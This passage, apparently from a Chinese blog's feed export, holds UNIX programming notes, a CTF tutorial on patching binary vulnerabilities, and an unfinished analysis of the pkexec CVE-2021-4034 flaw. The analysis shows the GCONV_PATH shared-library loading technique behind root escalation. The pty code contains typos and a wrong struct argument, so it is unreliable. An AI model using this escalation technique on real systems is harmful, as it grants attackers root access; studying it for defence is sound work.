class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (noecho)<br>            set_noecho(STDIN_FILENO);<br>        <br>        <span class="hljs-keyword">if</span> (execvp(argv[optind], &amp;argv[optind]) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t execute: %s&quot;</span>, argv[optind]);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (verbose) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;slave name = %s\n&quot;</span>, slave_name);<br>        <span class="hljs-keyword">if</span> (driver != <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;driver = %s\n&quot;</span>, driver);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (interactive &amp;&amp; driver == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (tty_raw(STDIN_FILENO) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;tty_raw error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (atexit(tty_atexit) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;atexit error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (driver)<br>        do_driver(driver); <span class="hljs-comment">//执行驱动程序</span><br>    loop(fdm, ignoreeof); <span class="hljs-comment">//fdm是主设备号，对pty设备进行读写</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">set_noecho</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">termios</span> <span class="hljs-title">stermios</span>;</span><br><br>    <span class="hljs-keyword">if</span> (tcgetattr(fd, &amp;stermios) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;tcgetaattr error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    stermios.c_cflag &amp;= ~(ECHO | ECHOE | ECHOK | ECHONL);<br>    stermios.c_oflag &amp;= ~(ONLCR);<br><br>    <span class="hljs-keyword">if</span> (tcsetattr(fd, TCSANOW, &amp;save_termios) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;tcsetattr error&quot;</span>);<br>        exix(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h1 id="数据库函数库"><a href="#数据库函数库" class="headerlink" title="数据库函数库"></a>数据库函数库</h1><p>打开数据库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue_db.h&quot;</span></span><br><br>DBHANDLE <span class="hljs-title function_">db_open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">int</span> oflag, ...<span class="hljs-comment">/*int mode */</span>)</span>;<br><span class="hljs-comment">//返回值：若成功，返回数据库句柄；若失败，返回NULL</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">db_close</span><span class="hljs-params">(DBHANDLE db)</span>;<br></code></pre></td></tr></table></figure><p>数据插入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue_db.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">db_store</span><span class="hljs-params">(DBHANDLE db, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data, <span class="hljs-type">int</span> flag)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回非0值</span><br></code></pre></td></tr></table></figure><ul><li><code>flag</code>为插入选项<ul><li><code>DB_INSERT</code>：插入一条新纪录</li><li><code>DB_REPLACE</code>：替换一条已有的记录</li><li><code>DB_STORE</code>：插入一条新记录或替换一条已有的记录</li></ul></li></ul><p>指定键从数据库中获取一条记录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue_db.h&quot;</span></span><br><br><span class="hljs-type">char</span> *<span class="hljs-title function_">db_fetch</span><span class="hljs-params">(DBHANDLE db, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key)</span>;<br><br><span class="hljs-comment">//返回值：若成功，返回指向数据的指针；若没有找到记录，则返回NULL</span><br></code></pre></td></tr></table></figure><p>删除一条记录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue_db.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">db_delete</span><span class="hljs-params">(DBHANDLE db, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若没有找到记录，返回-1</span><br></code></pre></td></tr></table></figure><p>回滚数据库以及逐条读每条记录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue_db.h&quot;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">db_rewind</span><span class="hljs-params">(DBHANDLE db)</span>;<br><span class="hljs-type">char</span> *<span class="hljs-title function_">db_nextrec</span><span class="hljs-params">(DBHANDLE db, <span class="hljs-type">char</span> *key)</span>;<br><br><span class="hljs-comment">//返回值：若成功，返回指向数据的指针；若到达数据库文件的尾端，返回NULL</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>UNIX编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu设置代理</title>
    <link href="/2023/06/27/Ubuntu%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <url>/2023/06/27/Ubuntu%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ced2901ab3cb37fc6ed961a1d408dbe02ee69981aea3b6973ad05acd80cc06b3">10d79030e8222445804370796b90fca1b3149e2c2a0f36d6b4ea04e548758c21a870ec70d103a738f6f7966a4e8aba7f1c102f41d40f7e4a730675938050868b1cfc312d2fd4a4a3f18849945fcd439652769031ca35313f55d621075d609b4faf44e086e27f1af0a8e03791872c4f783d0c07d8c3e978ba7927923d1d51ee29bdd4cc64254f7e530d55c0e9eb6d50df4044e11c9d0cd695eec8ddd210062446c549e377698e44d1d023e1d3a05a9fe70ebe902b6fb39554b4089617236ccb1c1c91d1f719694e554e9fbbcf1bff33caa7b78ef0222f4be3a0d6ee3c77f494e3e9c910afe779bc064c71160551b9e3fb3a016938487fb59b8a0f435ea0771183556b4a93caf935733af38cbabfccc62b61c26d828d950d8cc404f55a3c1c50b88298282e88e0400561a97021ee706fc63a32d5959c639b6ccc334fabfd321b362380d01a3415a65e4c0eaf34bd6cf0c359c84b80664894d31cfa9a4940e5f54cf6c99236e30da4be0b0189d325aa6a41a6db9e9c8815f3590b012b5034808976ccc2325ada859b36c7d3208bf5e81d5bc493688982f01c9854dbf7e309230a2b5a65a5ba60491f6ac1568b54774ecca1d5f33e0c475d266283c624209d5493ed62e91c897e3578380099db6fda56a5fc3ab26d72211b7061c22d3d5da5ed44150c29d046a7a14cade855218d317ac1b700d52c8209d452fd5bd39cda22a0fb4fc3b33ed30ebf3915f5eefe63a305fb1d6c600396bb818a610a2003c76a1461f3f54704f9842bc7b60c1a28dc9b3519ad2a5d6ef48faa279ade35e248e8e7539983d8c5b9efb542582a8ff5635831b02a6376d285894e566ea2850699a9ec136811a9a0ba01f5225f9bd006d852de021ecbd05d6b5fd25f9b758833d97482764d889d7408bbebdbe17688ebe508976cbb43025310aac42f396d88a6e980eb80580d9f048f811e9ce36cda3c6b471556dba5c7aefdda71711dfa2ad928186c2cb454d1c9ff35f4013a28598ca88aaafebac1b09beff9e797c3fe92325477e1609c256af097381cdca76111b2204d9ddd6ea5e1929f531cc503d3ae0dcc2873ca2e570dec948d70364a4c2991ab3124c3e4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代理设置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwn之简单patch</title>
    <link href="/2023/06/27/pwn%E4%B9%8B%E7%AE%80%E5%8D%95patch/"/>
    <url>/2023/06/27/pwn%E4%B9%8B%E7%AE%80%E5%8D%95patch/</url>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在攻防的时候不仅仅需要break，还需要fix将漏洞patch上。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>这里我使用的是<code>keypatch</code>这个ida脚本</p><p><strong>下载地址</strong>:<a href="https://github.com/keystone-engine/keypatch/blob/master/keypatch.py">https://github.com/keystone-engine/keypatch/blob/master/keypatch.py</a></p><h2 id="栈溢出的patch"><a href="#栈溢出的patch" class="headerlink" title="栈溢出的patch"></a>栈溢出的patch</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由于输入函数的输入长度超过了局部变量所开辟的空间，因此使得输入能够覆盖到返回地址</p><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>简单了解原理之后，我们可以知道，栈溢出起始就是输入的长度过大，那么我们将输入长度修改到局部变量开辟空间的范围内即可</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="32为情况下"><a href="#32为情况下" class="headerlink" title="32为情况下"></a>32为情况下</h4><p><img src="https://images.gitee.com/uploads/images/2020/0926/192944_f4ae3280_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>我们可以看到,<code>buf</code>距离<code>ebp</code>（栈底）距离0x28，但是输入却能够输入<code>0x100</code>，很明显的栈溢出漏洞</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/193149_b05ef9b5_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>可以看到这里参数为<code>0x100</code>，因为32位程序是通过栈传参的。</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/193245_d3c8ff98_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>再装好<code>keypatch</code>之后，会在<code>Edit</code>选项栏中出现<code>keypatch</code>的选项，接着选中参数<code>0x100</code>，点击patch</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/193552_0ac35c61_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>将长度改成小于<code>0x28</code>即可，这里需要注意输入长度要为16进制。这里输入输入3个<code>nop</code>指令是因为这条指令本身Size为5，然后<code>push 0x20</code>为2，因此需要填充三个<code>nop</code>与原本的Size一致。</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/193729_77f7ea6b_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>修改完毕后，保存即可</p><h4 id="64位情况下"><a href="#64位情况下" class="headerlink" title="64位情况下"></a>64位情况下</h4><p>我们知道64位下是通过寄存器传参数的，因此我们再找长度的参数时，找到相应的寄存器即可</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/194032_131ff431_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>例如<code>read</code>函数的长度参数是通过rdx(edx)传入的，找到相应的寄存器按照上面方法修改即可。</p><h2 id="格式化字符串的patch"><a href="#格式化字符串的patch" class="headerlink" title="格式化字符串的patch"></a>格式化字符串的patch</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>格式化字符串的漏洞是因为，程序中存在着格式化字符串输出函数，典型的<code>printf</code>，但是printf，只有格式化字符串参数，而没有后续的参数一,参数二,并且格式化字符串参数由我们所控制，从而导致了任意地址读写的漏洞触发。</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p><img src="https://images.gitee.com/uploads/images/2020/0926/194436_53c8bf01_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>题目中存在着典型的格式化字符串漏洞，那么修改漏洞有几种方法，例如将<code>printf</code>函数修改为<code>puts</code>函数或者添加<code>%s</code>的参数。</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>若程序中即存在<code>printf</code>函数，又存在<code>puts</code>函数，那么我们可以将<code>printf</code>函数修改为<code>puts</code>函数</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/194739_991b9066_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>我们找到<code>puts</code>函数的<code>plt</code>表地址，因为<code>puts</code>函数也是带一个参数，并且<code>puts</code>函数与<code>printf</code>函数的<code>plt</code>表地址长度一致，因此直接修改不会造成程序down掉</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/195049_491b1f2f_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>修改成<code>puts</code>函数的地址</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/195552_4bcf37ed_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>修改成功后的效果，但是<code>puts</code>函数与<code>printf</code>函数还是有一点点区别的，因为<code>puts</code>函数是自动在输出的字符串尾部加入一个回车符，在有些比赛的<code>check</code>脚本中是通过比较两次输入与输出是否全等，就会导致这种<code>patch</code>方法不能过关。</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>加入一个<code>%s</code>参数</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/195804_c2f8c919_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>可以看到除了传递格式化字符串参数以为，程序还存在<code>mov eax,0</code>，我们可以利用该指令修改，但是想要修改为<code>%s</code>还有一个问题，程序中不存在<code>%s</code>这个字符，就需要我们手动添加进去</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/195947_bd99e8e7_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>我们可以在<code>.eh_frame</code>这个段中填入<code>%s</code>这个字符串，这个段中的信息不会影响程序的正常运行。</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/200205_3ef3fed3_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>记住填入的地址<code>0x400c01</code></p><p><img src="https://images.gitee.com/uploads/images/2020/0926/201636_f4b5edc8_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov edi, offset 0x400c01;<br>mov rsi,offset format;<br></code></pre></td></tr></table></figure><p>完成参数修改</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/201701_a9782222_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>修改完成</p><h3 id="堆之uaf漏洞"><a href="#堆之uaf漏洞" class="headerlink" title="堆之uaf漏洞"></a>堆之uaf漏洞</h3><p>堆中较为常见的漏洞<code>use after free</code></p><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>由于堆块释放后没有给指针置空，使得被释放的堆块能够被修改或者重复使用，导致漏洞</p><h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><p><img src="https://images.gitee.com/uploads/images/2020/0926/202323_c9e8c7d6_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p><code>free</code>完之后没有将指针置空，很明显的<code>uaf</code>漏洞，想要修补<code>uaf</code>漏洞，则将<code>free</code>之后的指针置空即可</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/202431_26e0638e_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>可以看到在调用完<code>free</code>之后，没有多少空间可以写下新的汇编代码，因此需要与上一个方法一致，跳转到<code>.eh_frame</code>段上</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/203113_e02a0af9_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>将<code>call free</code>指令修改为跳转指令，在<code>.eh_frame</code>段上写汇编代码</p><p><img src="https://images.gitee.com/uploads/images/2020/0926/203526_772dd7f6_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call 0x900;           #调用free函数<br>mov     eax, [rbp-0xc]; #取出下标值<br>cdqe;<br>lea     rdx, ds:0[rax*8];<br>lea rax, qword ptr [heap];<br>mov r8,0; #段地址不能直接赋予立即数<br>mov [rdx+rax],r8;<br>jmp 0xD56;<br></code></pre></td></tr></table></figure><p><img src="https://images.gitee.com/uploads/images/2020/0926/203820_0e13fa3f_6555973.png" alt="输入图片说明" title="屏幕截图.png"></p><p>patch效果</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>对于栈溢出来说，patch比较简单，只需要修改输入长度即可</li><li>对于格式化字符串漏洞来说，若有<code>puts</code>函数则将<code>printf</code>函数修改为<code>puts</code>函数，若没有则在<code>.eh_frame</code>段上创造<code>%s</code></li><li>对于堆的<code>uaf</code>来说，漏洞patch思路很简单，只需要将指针置空即可，但是需要了解汇编代码。</li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/5868">https://xz.aliyun.com/t/5868</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>patch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-4034-Pkexec数组越界</title>
    <link href="/2023/06/27/CVE-2021-4034-Pkexec/"/>
    <url>/2023/06/27/CVE-2021-4034-Pkexec/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Qualys 研究团队在 polkit 的 pkexec 中发现了一个内存损坏漏洞，该 SUID 根程序默认安装在每个主要的 Linux 发行版上。这个易于利用的漏洞允许任何非特权用户通过在其默认配置中利用此漏洞来获得易受攻击主机上的完全 root 权限。</p><h2 id="pkexec"><a href="#pkexec" class="headerlink" title="pkexec"></a>pkexec</h2><p>Polkit（以前称为 PolicyKit）是一个用于在类 Unix 操作系统中控制系统范围权限的组件。它为非特权进程与特权进程通信提供了一种有组织的方式。也可以使用 polkit 执行具有提升权限的命令，使用命令 pkexec 后跟要执行的命令（具有 root 权限）。</p><p><strong>运行</strong></p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213180439855.png" alt="image-20220213180439855"></p><p><strong>完成认证即可使用root权限执行文件</strong></p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213180630939.png" alt="image-20220213180630939"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213180823117.png" alt="image-20220213180823117"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>变量<code>n</code>初始值被设置为1，循环执行的次数为参数的个数，但是若参数个数为0时，此时变量<code>n</code>仍然为1，并且后面执行的语句会将<code>argv[n]</code>的值取出则造成了数组越界。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213232529940.png" alt="image-20220213232529940"></p><p><strong>test1.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc:%d\n&quot;</span>,argc);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;argc;i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argv[%d]:%s\n&quot;</span>,i,argv[i]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将<code>test.c</code>编译执行，发现argv[0]为执行文件所在路径。并且参数个数也是为1，不会出现为0的情况。因此在这种情况下<code>pkexec</code>不会出现数组越界的情况。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213205243447.png" alt="image-20220213205243447"></p><p><strong>test2.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> * <span class="hljs-type">const</span> args[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br><span class="hljs-type">char</span> * <span class="hljs-type">const</span> environ[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br>execve(<span class="hljs-string">&quot;./test&quot;</span>,args,environ);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将<code>test2.c</code>编译执行，使用<code>execve</code>函数启动<code>test1</code>文件，发现此时的<code>argc</code>为0。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213205327686.png" alt="image-20220213205327686"></p><p>那么使用<code>execve</code>函数调用<code>pkexec</code>文件就有可能会出现<code>argc</code>为0，造成数组越界，下图为调试<code>pkexec</code>时的情况，此时的<code>argc</code>为0,但是<code>n</code>为1，通过源码可以看到后续会读取<code>argv[n]</code>的值，因此造成了数组越界。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213210954503.png" alt="image-20220213210954503"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><code>pkexec</code>文件会执行<code>validate_environment_variable (key, value)</code>用于检测<code>key</code>所对应的环境变量是否合法。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213231658436.png" alt="image-20220213231658436"></p><p>若<code>key</code>所对应的环境变量不合法则会采用<code>g_printerr</code>函数打印信息，<code>log_message</code>函数内部也是调用了<code>g_printerr</code>进行信息的打印。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213232159169.png" alt="image-20220213232159169"></p><p><code>exp</code>利用<code>g_printerr</code>打印错误信息时特殊的执行流程进行<code>getshell</code>。</p><p>当<code>Linux</code>中<code>CHARSET</code>不是设置为<code>UTF-8</code>格式，则会调用<code>iconv</code>，用于将文本从一种编码转化为另一种编码。</p><p>在调用<code>iconv</code>之前需要通过使用<code>iconv_open</code>分配转化描述符号。</p><p><code>iconv_open</code>函数受到<code>GCONV_PATH</code>环境变量影响</p><ul><li>若<code>GCONV_PATH</code>未设置，那么<code>iconv_open</code>会加载系统默认的模块配置的缓存文件。<ul><li>默认的配置文件位于<code>/usr/lib/gconv/gconv-modules</code></li></ul></li><li>若<code>GCONV_PATH</code>被设置，则会优先加载设置路径下的配置文件。</li></ul><p>查看默认的配置文件信息<code>gconv-modules</code>，该配置文件指定了编码转换的键值对，并且通过指定的<code>so</code>文件执行转换。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213213858159.png" alt="image-20220213213858159"></p><p><code>main_g_printerr.c</code>文件中调用了<code>g_printerr</code>函数，而<code>test3.c</code>则是我们稍后需要编译成<code>.so</code>的文件，尝试利用<code>g_printerr</code>函数执行自行编译的<code>so</code>库。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//main_g_printerr.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>g_printerr(<span class="hljs-string">&quot;Hello World!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//test3.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gconv</span><span class="hljs-params">()</span><br>&#123;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gconv_init</span><span class="hljs-params">(<span class="hljs-type">void</span> *step)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello test3\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//配置文件 gconv-modules</span><br><span class="hljs-comment">//将编码为ABCD转化为UTF-8，具体转化流程根据test3.so文件</span><br>module UTF<span class="hljs-number">-8</span><span class="hljs-comment">// ABCD// test3 1</span><br></code></pre></td></tr></table></figure><p>将<code>main_g_printerr.c</code>编译为<code>main_g_printerr</code>，<code>test3.c</code>编译为<code>test3.so</code>，<code>gconv-modules</code>为配置文件，内容如上。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213220615315.png" alt="image-20220213220615315"></p><p>设置<code>CHARSET</code>为<code>ABCD</code>,因为配置文件写的是从<code>ABCD</code>转化为<code>UTF-8</code>，然后将环境变量<code>GCONV_PATH</code>设置为当前目录。执行<code>main_g_printerr</code>发现输出的是<code>.so</code>文件中的<code>Hello test3</code></p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213220843903.png" alt="image-20220213220843903"></p><p><code>pkexec</code>是具有<code>suid</code>特殊权限的文件，因此执行<code>pkexec</code>文件时是具有<code>root</code>权限的。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213225301733.png" 